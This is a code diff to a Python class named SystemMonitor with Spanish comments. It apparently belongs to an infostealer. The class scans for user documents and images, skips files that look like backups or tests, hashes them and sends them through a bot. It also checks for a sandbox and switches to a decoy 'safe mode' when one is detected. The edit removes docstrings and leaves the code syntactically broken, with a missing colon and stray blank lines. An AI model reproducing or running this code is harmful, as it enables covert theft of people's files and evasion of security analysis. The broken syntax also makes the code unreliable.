@@ -265,8 +265,7 @@ class SystemMonitor:
         except Exception as e:
             logging.error(f"Error escaneando archivos: {e}")
 
-    def _is_relevant_file(self, file_path: Path) -> bool:
-        """Determina si un archivo es de interés"""
+    def _is_relevant_file(self, file_path: Path) -> bool
         valid_exts = {'.jpg', '.jpeg', '.png', '.pdf', '.docx', '.xlsx', '.txt'}
         banned_keywords = {'backup', 'temp', 'test', 'example', 'ReadMe'}
         
@@ -277,7 +276,7 @@ class SystemMonitor:
         )
 
     def _process_file(self, file_path: Path):
-        """Procesa y envía archivos con verificación de hash"""
+    
         try:
             file_hash = self._calculate_hash(file_path)
             
@@ -288,7 +287,7 @@ class SystemMonitor:
             logging.error(f"Error procesando archivo {file_path}: {e}")
 
     def _calculate_hash(self, file_path: Path) -> str:
-        """Calcula hash seguro del archivo"""
+    
         sha256 = hashlib.sha256()
         with file_path.open('rb') as f:
             while chunk := f.read(8192):
@@ -319,7 +318,7 @@ class SystemMonitor:
         self.bot._send_request("🔒 Modo seguro activado: Sistema estable")
 
     def run(self):
-        """Ejecución principal del sistema"""
+    
         if not AntiSandbox.check_environment():
             logging.warning("Entorno sospechoso detectado. Activando modo seguro.")
             self._safe_mode_operation()
